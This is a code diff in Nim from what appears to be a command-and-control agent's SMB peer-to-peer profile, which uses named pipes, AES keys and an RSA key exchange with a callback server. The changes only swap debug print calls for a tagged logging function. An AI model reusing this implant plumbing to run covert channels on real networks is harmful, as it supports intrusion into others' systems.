       discard DisconnectNamedPipe(profile.pipeHandle)
-      debug "[DEBUG] SMB P2P: Client handler finished"
+      debugLog "smb", "SMB P2P: Client handler finished"
       
       if clientShouldExit:
-        debug "[DEBUG] SMB P2P: Exit command received, shutting down server"
+        debugLog "smb", "SMB P2P: Exit command received, shutting down server"
         break
       
       # Close and recreate pipe for next connection
       discard CloseHandle(profile.pipeHandle)
       profile.listening = false
       if not profile.startListening():
-        debug "[DEBUG] SMB P2P: Failed to recreate pipe for next connection"
+        debugLog "smb", "SMB P2P: Failed to recreate pipe for next connection"
         return
       
     except Exception as e:
-      debug "[DEBUG] SMB P2P: Error in accept loop: ", e.msg
+      debugLog "smb", "SMB P2P: Error in accept loop: ", e.msg
       # Try to recreate pipe
       if profile.listening:
         discard CloseHandle(profile.pipeHandle)
@@ -1018,7 +1018,7 @@ proc start*(profile: SmbProfile) =
   if profile.listening:
     discard CloseHandle(profile.pipeHandle)
     profile.listening = false
-  debug "[DEBUG] SMB P2P: Server shut down"
+  debugLog "smb", "SMB P2P: Server shut down"
 
 proc setAesKey*(profile: var SmbProfile, key: seq[byte]) =
   ## Set the AES encryption key
@@ -1037,11 +1037,11 @@ proc performKeyExchange*(profile: var SmbProfile): tuple[success: bool, newUuid:
   ## Returns (success, newUuid) tuple where newUuid is the callback UUID from server
   
   if not profile.config.encryptedExchange:
-    debug "[DEBUG] SMB P2P: No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
+    debugLog "smb", "SMB P2P: No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
     return (true, "")
   
   when not encryptedExchange:
-    debug "[DEBUG] SMB P2P: RSA not compiled in (ENCRYPTED_EXCHANGE_CHECK not set at build time)"
+    debugLog "smb", "SMB P2P: RSA not compiled in (ENCRYPTED_EXCHANGE_CHECK not set at build time)"
     return (true, "")
   
   else:
@@ -1057,5 +1057,5 @@ proc performKeyExchange*(profile: var SmbProfile): tuple[success: bool, newUuid:
     elif exchangeResult.success:
       return (true, "")
     else:
-      debug "[DEBUG] SMB P2P: Key exchange failed: ", exchangeResult.error
+      debugLog "smb", "SMB P2P: Key exchange failed: ", exchangeResult.error
       return (false, "")
